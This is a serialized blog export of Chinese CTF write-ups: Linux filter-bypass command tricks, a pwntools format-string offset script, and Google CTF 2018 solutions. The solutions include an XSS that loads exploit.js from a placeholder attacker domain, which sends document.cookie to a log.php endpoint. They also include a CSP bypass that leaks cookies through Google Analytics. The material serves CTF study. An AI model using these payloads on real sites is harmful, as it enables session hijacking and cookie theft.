title=\"linux下执行命令绕过字符串过滤\"></a>linux下执行命令绕过字符串过滤</h2><ol>\n<li><p>字符串拼接</p>\n<blockquote>\n<p>‘l’’s’</p>\n<p>‘ls’’-a’’l’</p>\n</blockquote>\n</li>\n<li><p>文件名绕过</p>\n<blockquote>\n<p>cat ‘fl’’ag’</p>\n<p>cat ‘fl*’</p>\n<p>cat ‘fl??’</p>\n</blockquote>\n</li>\n</ol>\n<h2 id=\"find命令执行\"><a href=\"#find命令执行\" class=\"headerlink\" title=\"find命令执行\"></a>find命令执行</h2><blockquote>\n<p>find /tmp -iname sth -or -exec ls \\;                会多次执行</p>\n<p>find /tmp -iname sth -or -exec ls \\; -quit        只执行一次</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"linux下执行命令绕过字符串过滤\"><a href=\"#linux下执行命令绕过字符串过滤\" class=\"headerlink\" title=\"linux下执行命令绕过字符串过滤\"></a>linux下执行命令绕过字符串过滤</h2><ol>\n<li><p>字符串拼接</p>\n<blockquote>\n<p>‘l’’s’</p>\n<p>‘ls’’-a’’l’</p>\n</blockquote>\n</li>\n<li><p>文件名绕过</p>\n<blockquote>\n<p>cat ‘fl’’ag’</p>\n<p>cat ‘fl*’</p>\n<p>cat ‘fl??’</p>\n</blockquote>\n</li>\n</ol>\n<h2 id=\"find命令执行\"><a href=\"#find命令执行\" class=\"headerlink\" title=\"find命令执行\"></a>find命令执行</h2><blockquote>\n<p>find /tmp -iname sth -or -exec ls \\;                会多次执行</p>\n<p>find /tmp -iname sth -or -exec ls \\; -quit        只执行一次</p>\n</blockquote>\n"},{"title":"linux格式化字符串漏洞","date":"2018-06-08T09:55:43.000Z","_content":"\n>  offset.py\n\n```\nfrom pwn import *\ncontext.log_level = 'debug'\n\ndef exec_fmt(payload):\n    p = process(\"./vuln\")\n    p.sendline(payload)\n    info = p.recv()\n    p.close()\n    return info\n\nautofmt = FmtStr(exec_fmt)\n\nprint autofmt.offset\n```\n\n","source":"_posts/linux格式化字符串漏洞.md","raw":"---\ntitle: linux格式化字符串漏洞\ndate: 2018-06-08 17:55:43\ntags: ctf\n---\n\n>  offset.py\n\n```\nfrom pwn import *\ncontext.log_level = 'debug'\n\ndef exec_fmt(payload):\n    p = process(\"./vuln\")\n    p.sendline(payload)\n    info = p.recv()\n    p.close()\n    return info\n\nautofmt = FmtStr(exec_fmt)\n\nprint autofmt.offset\n```\n\n","slug":"linux格式化字符串漏洞","published":1,"updated":"2018-06-30T02:02:51.269Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12h4000gqkdlfq6qpo7c","content":"<blockquote>\n<p> offset.py</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context.log_level = &apos;debug&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">def exec_fmt(payload):</span><br><span class=\"line\">    p = process(&quot;./vuln&quot;)</span><br><span class=\"line\">    p.sendline(payload)</span><br><span class=\"line\">    info = p.recv()</span><br><span class=\"line\">    p.close()</span><br><span class=\"line\">    return info</span><br><span class=\"line\"></span><br><span class=\"line\">autofmt = FmtStr(exec_fmt)</span><br><span class=\"line\"></span><br><span class=\"line\">print autofmt.offset</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p> offset.py</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context.log_level = &apos;debug&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">def exec_fmt(payload):</span><br><span class=\"line\">    p = process(&quot;./vuln&quot;)</span><br><span class=\"line\">    p.sendline(payload)</span><br><span class=\"line\">    info = p.recv()</span><br><span class=\"line\">    p.close()</span><br><span class=\"line\">    return info</span><br><span class=\"line\"></span><br><span class=\"line\">autofmt = FmtStr(exec_fmt)</span><br><span class=\"line\"></span><br><span class=\"line\">print autofmt.offset</span><br></pre></td></tr></table></figure>\n"},{"title":"googlectf2018","date":"2018-06-26T13:10:29.000Z","_content":"\n## Beginner's Quest - Moar\n\nWhen we netcat to the server we can see man socat output only. But man allows us to execute commands. All we need to do is to type !command. Running !ls -la /home/moar reveals some secret file disable_dmz.sh. Let's cat it.\n\nman命令允许执行命令\n\n```\n!ls /home/moar\ndisable_dmz.sh\n```\n\n```\nManual page socat(1) line 1 (press h for help or q to quit)!cat /home/moar/disable_dmz.sh\n!cat /home/moar/disable_dmz.sh\n#!/bin/sh\necho 'Disabling DMZ using password CTF{SOmething-CATastr0phic}'\necho CTF{SOmething-CATastr0phic} > /dev/dmz\n```\n\n## Beginner's Router UI\n\n```\n <body class=\"text-center\">\n    <form class=\"form-signin\" method=\"post\">\n      <h1 class=\"h3 mb-3 font-weight-normal\">OffHub Management Interface</h1>\n      <input type=\"text\" name=\"username\" class=\"form-control\" placeholder=\"username\">\n      <input type=\"password\" name=\"password\" class=\"form-control\" placeholder=\"password\">\n      <button class=\"btn btn-block\" type=\"submit\">Sign in</button>\n    </form>\n  </body>\n```\n\npayload;\n\n```\nlogin:<script src=https:\npassword:[YOURDOMAIN]/exploit.js></script>\n```\n\n结果:\n\n```\n<script src=https://YOURDOMAIN/exploit.js></script>\n```\n\n由于管理员只会查看邮件，所以需要先构建一个能够自动登录的website.html。\n\nwebsite.html:\n\n```\n<!DOCTYPE HTML>\n<html lang=\"en\">\n<head>\n\t<meta charset=\"utf-8\" />\n\t<title>Cats</title>\n</head>\n<body>\n\t<form method=\"POST\" action=\"https://router-ui.web.ctfcompetition.com/login\">\n\t\t<input name=\"username\" value=\"&lt;script src=https:\">\n\t\t<input name=\"password\" value=\"[YOURDOMAIN]/exploit.js&gt;&lt/script&gt;\">\n\t</form>\n\t<script>\n\t\tdocument.forms[0].submit();\n\t</script>\n</body>\n</html>\n```\n\n这样，当管理员点击该页面之后，就会自动登录，从而执行我们的payload。\n\nexploit.js:\n\n```\nwindow.location.href='https://[YOURDOMAIN]/log.php?'+document.cookie;\n\n```\n\n## gcalc\n\napp.js\n\n```js\nvar e = \"function\" == typeof Object.assign ? Object.assign : function(a, b) {\n        for (var c = 1; c < arguments.length; c++) {\n            var d = arguments[c];\n            if (d)\n                for (var f in d) Object.prototype.hasOwnProperty.call(d, f) && (a[f] = d[f])\n        }\n        return a\n    },\n    g = \"function\" == typeof Object.defineProperties ? Object.defineProperty : function(a, b, c) {\n        a != Array.prototype && a != Object.prototype && (a[b] = c.value)\n    },\n    h = \"undefined\" != typeof window && window === this ? this : \"undefined\" != typeof global && null != global ? global : this;\n\nfunction k(a) {\n    if (a) {\n        for (var b = h, c = [\"Object\", \"assign\"], d = 0; d < c.length - 1; d++) {\n            var f = c[d];\n            f in b || (b[f] = {});\n            b = b[f]\n        }\n        c = c[c.length - 1];\n        d = b[c];\n        a = a(d);\n        a != d && null != a && g(b, c, {\n            configurable: !0,\n            writable: !0,\n            value: a\n        })\n    }\n}\nk(function(a) {\n    return a || e\n});\n\nfunction l(a, b, c, d, f) {\n    this.location = a;\n    this.c = b;\n    this.mdDialog = d;\n    this.f = f;\n    n(this);\n    a = a.search();\n    if (a.expr && a.vars) try {\n        var m = p(a.expr, a.vars);\n        this.a = this.screen = \"\";\n        q(this, m);\n        this.b.ans = parseFloat(m) || 0\n    } catch (v) {\n        q(this, \"Error\")\n    }\n}\nl.$inject = [\"$location\", \"$http\", \"$httpParamSerializer\", \"$mdDialog\", \"vcRecaptchaService\"];\n\nfunction q(a, b) {\n    a.screen = a.a ? a.screen + b : b\n}\n\nfunction n(a) {\n    a.screen = \"0\";\n    a.a = \"\";\n    a.b = {\n        pi: 3.14159,\n        ans: 0\n    }\n}\n\nfunction p(a, b) {\n    a = String(a).toLowerCase();\n    b = String(b);\n    if (!/^(?:[\\(\\)\\*\\/\\+%\\-0-9 ]|\\bvars\\b|[.]\\w+)*$/.test(a)) throw Error(a);\n    b = JSON.parse(b, function(a, b) {\n        if (b && \"object\" === typeof b && !Array.isArray(b)) return Object.assign(Object.create(null), b);\n        if (\"number\" === typeof b) return b\n    });\n    return (new Function(\"vars\", \"return \" + a))(b)\n}\n\nfunction r(a) {\n    try {\n        return p(a.a, JSON.stringify(a.b))\n    } catch (b) {\n        return \"Error\"\n    }\n}\n\nfunction t(a) {\n    var b = new URL(\"https://gcalc2.web.ctfcompetition.com\");\n    b.pathname = \"/\";\n    b.searchParams.set(\"expr\", a.a);\n    b.searchParams.set(\"vars\", JSON.stringify(a.b));\n    return b + \"\"\n}\nl.prototype.permalink = function() {\n    this.mdDialog.show(this.mdDialog.alert({\n        title: \"Link\",\n        htmlContent: t(this),\n        ok: \"Ok\"\n    }))\n};\nl.prototype.showCaptcha = function() {\n    this.mdDialog.show({\n        contentElement: \"#captchaDialog\",\n        parent: angular.element(document.body)\n    })\n};\nl.prototype.cloud = function() {\n    var a = this.f.getResponse();\n    a ? (this.c({\n        method: \"POST\",\n        url: \"/report\",\n        data: {\n            expr: this.a,\n            vars: JSON.stringify(this.b),\n            recaptcha: a\n        }\n    }), this.mdDialog.hide()) : alert(\"Wrong captcha.\")\n};\nl.prototype.btnClick = function(a) {\n    if (/[0-9.]/.test(a)) q(this, a), this.a += a;\n    else if (/[*\\/+%-]/.test(a)) q(this, \" \" + a + \" \"), this.a += a;\n    else if (/[(]/.test(a)) q(this, \" \" + a), this.a += a;\n    else if (/[)]/.test(a)) q(this, a + \" \"), this.a += a;\n    else if (\"\\u03c0\" == a) q(this, \" \\u03c0 \"), this.a += \" vars.pi\";\n    else switch (a) {\n        case \"ac\":\n            n(this);\n            break;\n        case \"ans\":\n            q(this, \" Ans \");\n            this.a += \" vars.ans\";\n            break;\n        case \"=\":\n            if (!this.a) break;\n            a = r(this);\n            this.a = this.screen = \"\";\n            q(this, a);\n            this.b.ans = parseFloat(a) || 0;\n            break;\n        case \"pow\":\n            if (!this.a) break;\n            a =\n                r(this);\n            a *= a;\n            this.screen = \"\";\n            this.a = parseFloat(a) || 0;\n            q(this, a);\n            this.b.ans = parseFloat(a) || 0;\n            break;\n        case \"sqrt\":\n            this.a && (a = Math.sqrt(r(this)), this.screen = \"\", this.a = parseFloat(a) || 0, q(this, a), this.b.ans = parseFloat(a) || 0)\n    }\n};\n\nfunction u(a) {\n    a.html5Mode(!0)\n}\nu.$inject = [\"$locationProvider\"];\nangular.module(\"calcApp\", [\"ngMaterial\", \"ngMessages\", \"ngSanitize\", \"vcRecaptcha\"]).controller(\"CalcCtrl\", l).config(u);\n```\n\n漏洞点：\n\n```\nfunction p(a, b) {\n    a = String(a).toLowerCase();\n    b = String(b);\n    if (!/^(?:[\\(\\)\\*\\/\\+%\\-0-9 ]|\\bvars\\b|[.]\\w+)*$/.test(a)) throw Error(a);\n    b = JSON.parse(b, function(a, b) {\n        if (b && \"object\" === typeof b && !Array.isArray(b)) return Object.assign(Object.create(null), b);\n        if (\"number\" === typeof b) return b\n    });\n    return (new Function(\"vars\", \"return \" + a))(b)\n}\n```\n\n该函数用户处理参数a,b对应我们的参数expr, vars。只要能够绕过该过滤即可实现XSS。\n\n有问题的paylaod:\n\n```\n// alert(1) // Remove whitespaces by yourself\nvars.pi.constructor.constructor(\n  vars.pi.toString().constructor.fromCharCode(97)+\n  vars.pi.toString().constructor.fromCharCode(108)+\n  vars.pi.toString().constructor.fromCharCode(101)+\n  vars.pi.toString().constructor.fromCharCode(114)+\n  vars.pi.toString().constructor.fromCharCode(116)+\n  vars.pi.toString().constructor.fromCharCode(40)+\n  vars.pi.toString().constructor.fromCharCode(49)+\n  vars.pi.toString().constructor.fromCharCode(41)\n)()\n```\n\n如果没有`String(a).toLowerCase()`，那么该payload可行。\n\n基础paylaod:\n\n```\nhttps://gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&vars={\"pi\":3.14159,\"ans\":0,\"alert(1)\":0}\n```\n\n使用上边的paylaod，我们可以执行alert()。\n\n接下来就是绕过CSP。\n\nCSP of /：\n\n```\nContent-Security-Policy: default-src 'self'; child-src https://sandbox-gcalc2.web.ctfcompetition.com/\n```\n\nCSP of  /static/calc.html:\n\n```\nContent-Security-Policy: default-src 'self'; frame-ancestors https://gcalc2.web.ctfcompetition.com/; font-src https://fonts.gstatic.com; style-src 'self' https://*.googleapis.com 'unsafe-inline'; script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://www.google-analytics.com https://*.googleapis.com 'unsafe-eval' https://www.googletagmanager.com; child-src https://www.google.com/recaptcha/; img-src https://www.google-analytics.com;\n```\n\n我们看到``img-src https://www.google-analytics.com;``\n\n那么就可以通过google-analystic获取cookie。\n\n首先申请google-analystic，得到tid=UA-121623607-1\n\n有效payload:\n\n```\nhttps://gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&vars={%22pi%22:3.14159,%22ans%22:0,%20%22x=document.createElement(%27img%27);x.src=%27https://www.google-analytics.com/collect?v=1%26tid=UA-121623607-1%26cid=0000000000%26t=event%26ec=email%26ea=hao123%27;document.querySelector(%27body%27).append(x)%22:0}\n```\n\n最终payload:\n\n```\nhttps://gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&vars={%22pi%22:3.14159,%22ans%22:0,%20%22x=document.createElement(%27img%27);x.src=%27https://www.google-analytics.com/collect?v=1%26tid=UA-121623607-1%26cid=0000000000%26t=event%26ec=email%26ea=12344%27%2bencodeURIComponent(document.cookie);document.querySelector(%27body%27).append(x)%22:0}\n```\n\ngoogle-anaystic-console:\n\n```\nhttps://analytics.google.com/analytics/web/?hl=zh-CN&pli=1#/realtime/rt-event/a121623607w179580825p177873825/metric.type=5/\n```\n\n","source":"_posts/googlectf2018.md","raw":"---\ntitle: googlectf2018\ndate: 2018-06-26 21:10:29\ntags: ctf\n---\n\n## Beginner's Quest - Moar\n\nWhen we netcat to the server we can see man socat output only. But man allows us to execute commands. All we need to do is to type !command. Running !ls -la /home/moar reveals some secret file disable_dmz.sh. Let's cat it.\n\nman命令允许执行命令\n\n```\n!ls /home/moar\ndisable_dmz.sh\n```\n\n```\nManual page socat(1) line 1 (press h for help or q to quit)!cat /home/moar/disable_dmz.sh\n!cat /home/moar/disable_dmz.sh\n#!/bin/sh\necho 'Disabling DMZ using password CTF{SOmething-CATastr0phic}'\necho CTF{SOmething-CATastr0phic} > /dev/dmz\n```\n\n## Beginner's Router UI\n\n```\n <body class=\"text-center\">\n    <form class=\"form-signin\" method=\"post\">\n      <h1 class=\"h3 mb-3 font-weight-normal\">OffHub Management Interface</h1>\n      <input type=\"text\" name=\"username\" class=\"form-control\" placeholder=\"username\">\n      <input type=\"password\" name=\"password\" class=\"form-control\" placeholder=\"password\">\n      <button class=\"btn btn-block\" type=\"submit\">Sign in</button>\n    </form>\n  </body>\n```\n\npayload;\n\n```\nlogin:<script src=https:\npassword:[YOURDOMAIN]/exploit.js></script>\n```\n\n结果:\n\n```\n<script src=https://YOURDOMAIN/exploit.js></script>\n```\n\n由于管理员只会查看邮件，所以需要先构建一个能够自动登录的website.html。\n\nwebsite.html:\n\n```\n<!DOCTYPE HTML>\n<html lang=\"en\">\n<head>\n\t<meta charset=\"utf-8\" />\n\t<title>Cats</title>\n</head>\n<body>\n\t<form method=\"POST\" action=\"https://router-ui.web.ctfcompetition.com/login\">\n\t\t<input name=\"username\" value=\"&lt;script src=https:\">\n\t\t<input name=\"password\" value=\"[YOURDOMAIN]/exploit.js&gt;&lt/script&gt;\">\n\t</form>\n\t<script>\n\t\tdocument.forms[0].submit();\n\t</script>\n</body>\n</html>\n```\n\n这样，当管理员点击该页面之后，就会自动登录，从而执行我们的payload。\n\nexploit.js:\n\n```\nwindow.location.href='https://[YOURDOMAIN]/log.php?'+document.cookie;\n\n```\n\n## gcalc\n\napp.js\n\n```js\nvar e = \"function\" == typeof Object.assign ? Object.assign : function(a, b) {\n        for (var c = 1; c < arguments.length; c++) {\n            var d = arguments[c];\n            if (d)\n                for (var f in d) Object.prototype.hasOwnProperty.call(d, f) && (a[f] = d[f])\n        }\n        return a\n    },\n    g = \"function\" == typeof Object.defineProperties ? Object.defineProperty : function(a, b, c) {\n        a != Array.prototype && a != Object.prototype && (a[b] = c.value)\n    },\n    h = \"undefined\" != typeof window && window === this ? this : \"undefined\" != typeof global && null != global ? global : this;\n\nfunction k(a) {\n    if (a) {\n        for (var b = h, c = [\"Object\", \"assign\"], d = 0; d < c.length - 1; d++) {\n            var f = c[d];\n            f in b || (b[f] = {});\n            b = b[f]\n        }\n        c = c[c.length - 1];\n        d = b[c];\n        a = a(d);\n        a != d && null != a && g(b, c, {\n            configurable: !0,\n            writable: !0,\n            value: a\n        })\n    }\n}\nk(function(a) {\n    return a || e\n});\n\nfunction l(a, b, c, d, f) {\n    this.location = a;\n    this.c = b;\n    this.mdDialog = d;\n    this.f = f;\n    n(this);\n    a = a.search();\n    if (a.expr && a.vars) try {\n        var m = p(a.expr, a.vars);\n        this.a = this.screen = \"\";\n        q(this, m);\n        this.b.ans = parseFloat(m) || 0\n    } catch (v) {\n        q(this, \"Error\")\n    }\n}\nl.$inject = [\"$location\", \"$http\", \"$httpParamSerializer\", \"$mdDialog\", \"vcRecaptchaService\"];\n\nfunction q(a, b) {\n    a.screen = a.a ? a.screen + b : b\n}\n\nfunction n(a) {\n    a.screen = \"0\";\n    a.a = \"\";\n    a.b = {\n        pi: 3.14159,\n        ans: 0\n    }\n}\n\nfunction p(a, b) {\n    a = String(a).toLowerCase();\n    b = String(b);\n    if (!/^(?:[\\(\\)\\*\\/\\+%\\-0-9 ]|\\bvars\\b|[.]\\w+)*$/.test(a)) throw Error(a);\n    b = JSON.parse(b, function(a, b) {\n        if (b && \"object\" === typeof b && !Array.isArray(b)) return Object.assign(Object.create(null), b);\n        if (\"number\" === typeof b) return b\n    });\n    return (new Function(\"vars\", \"return \" + a))(b)\n}\n\nfunction r(a) {\n    try {\n        return p(a.a, JSON.stringify(a.b))\n    } catch (b) {\n        return \"Error\"\n    }\n}\n\nfunction t(a) {\n    var b = new URL(\"https://gcalc2.web.ctfcompetition.com\");\n    b.pathname = \"/\";\n    b.searchParams.set(\"expr\", a.a);\n    b.searchParams.set(\"vars\", JSON.stringify(a.b));\n    return b + \"\"\n}\nl.prototype.permalink = function() {\n    this.mdDialog.show(this.mdDialog.alert({\n        title: \"Link\",\n        htmlContent: t(this),\n        ok: \"Ok\"\n    }))\n};\nl.prototype.showCaptcha = function() {\n    this.mdDialog.show({\n        contentElement: \"#captchaDialog\",\n        parent: angular.element(document.body)\n    })\n};\nl.prototype.cloud = function() {\n    var a = this.f.getResponse();\n    a ? (this.c({\n        method: \"POST\",\n        url: \"/report\",\n        data: {\n            expr: this.a,\n            vars: JSON.stringify(this.b),\n            recaptcha: a\n        }\n    }), this.mdDialog.hide()) : alert(\"Wrong captcha.\")\n};\nl.prototype.btnClick = function(a) {\n    if (/[0-9.]/.test(a)) q(this, a), this.a += a;\n    else if (/[*\\/+%-]/.test(a)) q(this, \" \" + a + \" \"), this.a += a;\n    else if (/[(]/.test(a)) q(this, \" \" + a), this.a += a;\n    else if (/[)]/.test(a)) q(this, a + \" \"), this.a += a;\n    else if (\"\\u03c0\" == a) q(this, \" \\u03c0 \"), this.a += \" vars.pi\";\n    else switch (a) {\n        case \"ac\":\n            n(this);\n            break;\n        case \"ans\":\n            q(this, \" Ans \");\n            this.a += \" vars.ans\";\n            break;\n        case \"=\":\n            if (!this.a) break;\n            a = r(this);\n            this.a = this.screen = \"\";\n            q(this, a);\n            this.b.ans = parseFloat(a) || 0;\n            break;\n        case \"pow\":\n            if (!this.a) break;\n            a =\n                r(this);\n            a *= a;\n            this.screen = \"\";\n            this.a = parseFloat(a) || 0;\n            q(this, a);\n            this.b.ans = parseFloat(a) || 0;\n            break;\n        case \"sqrt\":\n            this.a && (a = Math.sqrt(r(this)), this.screen = \"\", this.a = parseFloat(a) || 0, q(this, a), this.b.ans = parseFloat(a) || 0)\n    }\n};\n\nfunction u(a) {\n    a.html5Mode(!0)\n}\nu.$inject = [\"$locationProvider\"];\nangular.module(\"calcApp\", [\"ngMaterial\", \"ngMessages\", \"ngSanitize\", \"vcRecaptcha\"]).controller(\"CalcCtrl\", l).config(u);\n```\n\n漏洞点：\n\n```\nfunction p(a, b) {\n    a = String(a).toLowerCase();\n    b = String(b);\n    if (!/^(?:[\\(\\)\\*\\/\\+%\\-0-9 ]|\\bvars\\b|[.]\\w+)*$/.test(a)) throw Error(a);\n    b = JSON.parse(b, function(a, b) {\n        if (b && \"object\" === typeof b && !Array.isArray(b)) return Object.assign(Object.create(null), b);\n        if (\"number\" === typeof b) return b\n    });\n    return (new Function(\"vars\", \"return \" + a))(b)\n}\n```\n\n该函数用户处理参数a,b对应我们的参数expr, vars。只要能够绕过该过滤即可实现XSS。\n\n有问题的paylaod:\n\n```\n// alert(1) // Remove whitespaces by yourself\nvars.pi.constructor.constructor(\n  vars.pi.toString().constructor.fromCharCode(97)+\n  vars.pi.toString().constructor.fromCharCode(108)+\n  vars.pi.toString().constructor.fromCharCode(101)+\n  vars.pi.toString().constructor.fromCharCode(114)+\n  vars.pi.toString().constructor.fromCharCode(116)+\n  vars.pi.toString().constructor.fromCharCode(40)+\n  vars.pi.toString().constructor.fromCharCode(49)+\n  vars.pi.toString().constructor.fromCharCode(41)\n)()\n```\n\n如果没有`String(a).toLowerCase()`，那么该payload可行。\n\n基础paylaod:\n\n```\nhttps://gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&vars={\"pi\":3.14159,\"ans\":0,\"alert(1)\":0}\n```\n\n使用上边的paylaod，我们可以执行alert()。\n\n接下来就是绕过CSP。\n\nCSP of /：\n\n```\nContent-Security-Policy: default-src 'self'; child-src https://sandbox-gcalc2.web.ctfcompetition.com/\n```\n\nCSP of  /static/calc.html:\n\n```\nContent-Security-Policy: default-src 'self'; frame-ancestors https://gcalc2.web.ctfcompetition.com/; font-src https://fonts.gstatic.com; style-src 'self' https://*.googleapis.com 'unsafe-inline'; script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://www.google-analytics.com https://*.googleapis.com 'unsafe-eval' https://www.googletagmanager.com; child-src https://www.google.com/recaptcha/; img-src https://www.google-analytics.com;\n```\n\n我们看到``img-src https://www.google-analytics.com;``\n\n那么就可以通过google-analystic获取cookie。\n\n首先申请google-analystic，得到tid=UA-121623607-1\n\n有效payload:\n\n```\nhttps://gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&vars={%22pi%22:3.14159,%22ans%22:0,%20%22x=document.createElement(%27img%27);x.src=%27https://www.google-analytics.com/collect?v=1%26tid=UA-121623607-1%26cid=0000000000%26t=event%26ec=email%26ea=hao123%27;document.querySelector(%27body%27).append(x)%22:0}\n```\n\n最终payload:\n\n```\nhttps://gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&vars={%22pi%22:3.14159,%22ans%22:0,%20%22x=document.createElement(%27img%27);x.src=%27https://www.google-analytics.com/collect?v=1%26tid=UA-121623607-1%26cid=0000000000%26t=event%26ec=email%26ea=12344%27%2bencodeURIComponent(document.cookie);document.querySelector(%27body%27).append(x)%22:0}\n```\n\ngoogle-anaystic-console:\n\n```\nhttps://analytics.google.com/analytics/web/?hl=zh-CN&pli=1#/realtime/rt-event/a121623607w179580825p177873825/metric.type=5/\n```\n\n","slug":"googlectf2018","published":1,"updated":"2018-08-02T08:14:35.002Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12h7000iqkdlduxnlc4q","content":"<h2 id=\"Beginner’s-Quest-Moar\"><a href=\"#Beginner’s-Quest-Moar\" class=\"headerlink\" title=\"Beginner’s Quest - Moar\"></a>Beginner’s Quest - Moar</h2><p>When we netcat to the server we can see man socat output only. But man allows us to execute commands. All we need to do is to type !command. Running !ls -la /home/moar reveals some secret file disable_dmz.sh. Let’s cat it.</p>\n<p>man命令允许执行命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">!ls /home/moar</span><br><span class=\"line\">disable_dmz.sh</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Manual page socat(1) line 1 (press h for help or q to quit)!cat /home/moar/disable_dmz.sh</span><br><span class=\"line\">!cat /home/moar/disable_dmz.sh</span><br><span class=\"line\">#!/bin/sh</span><br><span class=\"line\">echo &apos;Disabling DMZ using password CTF&#123;SOmething-CATastr0phic&#125;&apos;</span><br><span class=\"line\">echo CTF&#123;SOmething-CATastr0phic&#125; &gt; /dev/dmz</span><br></pre></td></tr></table></figure>\n<h2 id=\"Beginner’s-Router-UI\"><a href=\"#Beginner’s-Router-UI\" class=\"headerlink\" title=\"Beginner’s Router UI\"></a>Beginner’s Router UI</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;body class=&quot;text-center&quot;&gt;</span><br><span class=\"line\">   &lt;form class=&quot;form-signin&quot; method=&quot;post&quot;&gt;</span><br><span class=\"line\">     &lt;h1 class=&quot;h3 mb-3 font-weight-normal&quot;&gt;OffHub Management Interface&lt;/h1&gt;</span><br><span class=\"line\">     &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;username&quot;&gt;</span><br><span class=\"line\">     &lt;input type=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;password&quot;&gt;</span><br><span class=\"line\">     &lt;button class=&quot;btn btn-block&quot; type=&quot;submit&quot;&gt;Sign in&lt;/button&gt;</span><br><span class=\"line\">   &lt;/form&gt;</span><br><span class=\"line\"> &lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<p>payload;</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">login:&lt;script src=https:</span><br><span class=\"line\">password:[YOURDOMAIN]/exploit.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>结果:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=https://YOURDOMAIN/exploit.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>由于管理员只会查看邮件，所以需要先构建一个能够自动登录的website.html。</p>\n<p>website.html:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE HTML&gt;</span><br><span class=\"line\">&lt;html lang=&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">\t&lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class=\"line\">\t&lt;title&gt;Cats&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">\t&lt;form method=&quot;POST&quot; action=&quot;https://router-ui.web.ctfcompetition.com/login&quot;&gt;</span><br><span class=\"line\">\t\t&lt;input name=&quot;username&quot; value=&quot;&amp;lt;script src=https:&quot;&gt;</span><br><span class=\"line\">\t\t&lt;input name=&quot;password&quot; value=&quot;[YOURDOMAIN]/exploit.js&amp;gt;&amp;lt/script&amp;gt;&quot;&gt;</span><br><span class=\"line\">\t&lt;/form&gt;</span><br><span class=\"line\">\t&lt;script&gt;</span><br><span class=\"line\">\t\tdocument.forms[0].submit();</span><br><span class=\"line\">\t&lt;/script&gt;</span><br><span 